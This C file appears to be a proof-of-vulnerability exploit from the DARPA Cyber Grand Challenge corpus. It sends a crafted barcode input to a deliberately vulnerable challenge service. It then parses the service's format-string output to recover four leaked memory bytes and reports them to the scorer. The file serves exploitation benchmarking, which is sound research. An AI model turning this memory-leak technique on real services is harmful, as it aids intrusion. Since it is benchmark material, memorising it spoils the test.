/*
 * Copyright (c) 2014 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */

#include "libpov.h"
#include "libcgc.h"
#include "cgc_stdio.h"
#include "cgc_povbarcode.h"

#define transmit_str(_str) cgc_transmit_all(STDOUT, (_str), cgc_strlen((_str)))
#define transmit_type2_byte(_pov) cgc_transmit_all(3, (_pov), sizeof(char))
#define transmit_type2_short(_pov) cgc_transmit_all(3, (_pov), sizeof(short))
#define transmit_type2_int(_pov) cgc_transmit_all(3, (_pov), sizeof(int))
#define transmit_type2(_pov, _size) cgc_transmit_all(3, (_pov), (_size))

void cgc_read_until_line(char *line)
{
    unsigned char *resp = NULL;
    unsigned int resp_len = 0;
    int ready = 0;
    while (!ready) {
        cgc_delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
        cgc_transmit_all(STDERR, resp, resp_len);
        if (cgc_memcmp(resp, line, cgc_strlen(line)) == 0) {
            ready = 1;
        }
    }
}

int cgc_negotiate_type_1(unsigned int *target_eip, unsigned int *target_reg, unsigned int reg_num)
{
    unsigned int pov_type = 1;
    unsigned int eip_mask = 0xfefefefe;
    unsigned int reg_mask = 0xfefefefe;

    // negotiate type 1
    cgc_transmit_all(3, &pov_type, sizeof(pov_type));
    cgc_transmit_all(3, &eip_mask, sizeof(eip_mask));
    cgc_transmit_all(3, &reg_mask, sizeof(reg_mask));
    cgc_transmit_all(3, &reg_num, sizeof(reg_num));

    if (cgc_length_read(3, (unsigned char *)target_eip, sizeof(*target_eip)) != sizeof(*target_eip))
        return -1;
    if (cgc_length_read(3, (unsigned char *)target_reg, sizeof(*target_reg)) != sizeof(*target_reg))
        return -1;

    return 0;
}

void cgc_negotiate_type_2()
{
    unsigned int pov_type = 2;
    cgc_transmit_all(3, &pov_type, sizeof(pov_type));
    unsigned int type2_resp[2];
    if (cgc_length_read(3, (unsigned char *)type2_resp, sizeof(type2_resp)) != sizeof(type2_resp))
        cgc__terminate(0);
}

int main(int cgc_argc, char *cgc_argv[])
{
    cgc_negotiate_type_2();

    unsigned char type2_buf[4];
    unsigned char c;

    cgc_transmit_all(STDOUT, "ldof", 4);

    char *input_barcode = "1\n3\n";
    transmit_str(input_barcode);
    cgc_transmit_all(STDOUT, POVBARCODE, sizeof(POVBARCODE));

    int i = 0, ex_count = 0;
    // skip to output of format string
    while (ex_count < 3)
    {
        if (cgc_length_read(STDIN, &c, 1) != 1)
            cgc__terminate(0);
        if (c == '!')
            ex_count++;
        else
            ex_count = 0;
    }
    // cgc_read leaked bytes until exclamation
    while (i < 4)
    {
        if (cgc_length_read(STDIN, &c, 1) != 1)
            cgc__terminate(0);
        cgc_fprintf(cgc_stderr, "%c", c);

        if (c == '!')
            break;
        type2_buf[i++] = c;
    }
    if (i < 4)
    {
        // we hit an exclamation mark
        // cgc_read next byte to determine if it is NUL or exclamation
        if (cgc_length_read(STDIN, &c, 1) != 1)
            cgc__terminate(0);
        if (c == '!') // NUL
        {
            type2_buf[i++] = 0;
            // skip to next leak (assume these return exlamation)
            cgc_length_read(STDIN, &c, 1);
            cgc_length_read(STDIN, &c, 1);
            if (i > 1)
            {
                ex_count = 0;
                while (ex_count < 5)
                {
                    cgc_length_read(STDIN, &c, 1);
                    if (c == '!')
                        ex_count++;
                    else
                        ex_count = 0;
                }
            }
            if (i > 2)
            {
                ex_count = 0;
                while (ex_count < 6)
                {
                    cgc_length_read(STDIN, &c, 1);
                    if (c == '!')
                        ex_count++;
                    else
                        ex_count = 0;
                }
            }
            if (i < 4)
            {
                while (i < 4)
                {
                    cgc_length_read(STDIN, &c, 1);
                    // pray
                    type2_buf[i++] = c;
                }
            }
        }
        else
        {
            type2_buf[i++] = '!';
            while (i < 4)
            {
                type2_buf[i++] = c;
                // pray
                cgc_length_read(STDIN, &c, 1);
            }
        }
    }
    cgc_transmit_all(3, (unsigned char *) type2_buf, 4);

    char *cgc_exit = "6\n";
    transmit_str(cgc_exit);

    return 0;
}
